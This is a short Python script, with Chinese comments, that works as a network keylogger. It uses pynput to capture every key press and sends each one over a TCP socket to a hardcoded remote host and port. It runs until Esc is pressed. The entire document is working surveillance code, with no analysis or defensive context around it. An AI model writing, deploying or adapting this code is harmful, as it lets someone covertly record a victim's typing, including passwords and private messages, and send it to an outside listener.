from pynput.keyboard import Key, Listener
import socket
import re

host = "10.64.83.186"
port = 5051

s = socket.socket()
s.connect((host, port))


def on_press(key):
    key = str(key).encode()
    s.send(key)
    # 监听按键
    # print('{0} pressed'.format(key))
    print(key)


def on_release(key):
    # 监听释放
    # print('{0} release'.format(key))
    # print(key)
    if key == Key.esc:
        # Stop listener
        return False


if __name__ == '__main__':
    # 连接事件以及释放
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
